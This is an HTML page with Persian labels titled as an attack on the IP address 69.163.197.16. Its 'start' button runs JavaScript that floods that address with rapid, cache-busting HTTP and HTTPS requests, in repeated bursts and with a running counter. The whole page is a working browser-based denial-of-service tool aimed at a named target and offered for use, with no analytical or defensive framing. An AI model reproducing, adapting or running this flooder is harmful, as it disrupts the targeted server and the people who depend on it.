<!DOCTYPE html>
<html>
<head><title>فشار مستقیم به سرور</title></head>
<body>
<h2>حمله به 69.163.197.16</h2>
<button onclick="start()">🔥 شروع</button>
<button onclick="stop()">⛔ توقف</button>
<p id="s">منتظر...</p>
<script>
let run = false, c = 0;

function sendReq() {
    if(!run) return;
    let x = new XMLHttpRequest();
    x.open("GET", "http://69.163.197.16/?r=" + Math.random(), true);
    x.send();
    let x2 = new XMLHttpRequest();
    x2.open("GET", "https://69.163.197.16/?r=" + Math.random(), true);
    x2.send();
    c += 2;
    document.getElementById("s").innerHTML = "📨 درخواست: " + c;
    setTimeout(sendReq, 5);
}

function start() {
    run = true; c = 0;
    for(let i=0; i<100; i++) setTimeout(sendReq, i * 10);
    setInterval(() => {
        if(run) for(let i=0; i<50; i++) setTimeout(sendReq, i * 5);
    }, 2000);
    document.getElementById("s").innerHTML = "🔥 حمله شروع شد به 69.163.197.16";
}

function stop() {
    run = false;
    document.getElementById("s").innerHTML = "⛔ متوقف شد (" + c + " درخواست)";
}
</script>
</body>
</html>
